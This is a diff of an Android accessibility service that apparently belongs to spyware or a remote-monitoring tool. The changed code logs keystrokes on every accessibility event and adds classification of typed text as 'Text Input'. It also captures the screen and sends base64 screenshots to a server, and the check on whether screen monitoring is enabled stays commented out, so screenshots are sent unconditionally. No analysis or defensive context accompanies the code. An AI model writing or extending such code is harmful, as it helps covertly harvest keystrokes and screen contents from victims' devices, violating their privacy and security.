@@ -544,8 +544,6 @@ public class MainAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-//
-
         getKeyLogger(event);
         getSkeletonInfo(event);
         if(isAutostartEnable && manufacturer.equals("xiaomi") && Integer.parseInt(Build.VERSION.RELEASE) >= 12) {
@@ -756,6 +754,10 @@ public class MainAccessibilityService extends AccessibilityService {
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             text = event.getText().toString();
             eventString = "Navigation";
+            if (event.getContentChangeTypes() == AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT) {
+                text = event.getText().toString();
+                eventString = "Text Input";
+            }
         }
 
         if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
@@ -939,7 +941,6 @@ public class MainAccessibilityService extends AccessibilityService {
             Log.d("Root info", "no info");
         }
     }
-
     private void startCapture() {
         int width = deviceWidth;
         int height = deviceHeight;
@@ -1562,9 +1563,9 @@ public class MainAccessibilityService extends AccessibilityService {
     public void sendScreenMonitoringData(String base64Image) {
         Log.d("base64Image:::", "screenBase64");
         if (Server.getContext() != null) {
-            // if(isScreenMonitoring) {
+//            if(isScreenMonitoring) {
                 Server.getContext().sendScreenMonitoring(base64Image);
-            // }
+//            }
         }
     }
 
